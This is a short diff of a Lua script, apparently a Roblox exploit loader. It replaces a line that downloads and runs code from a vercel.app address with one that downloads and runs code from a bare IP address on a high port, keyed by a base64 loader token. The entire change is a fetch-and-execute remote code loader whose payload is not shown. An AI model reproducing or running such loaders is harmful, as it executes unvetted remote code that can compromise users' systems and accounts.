@@ -1,2 +1,1 @@
-ID = "vjVwtEQF"
-loadstring(game:HttpGet("https://rayzhubb.vercel.app/api/main.lua"))()
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjI0NGM4MjczLWU4NjEtNDY5OS1iMjIzLTYyNTViMDM5M2YzYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
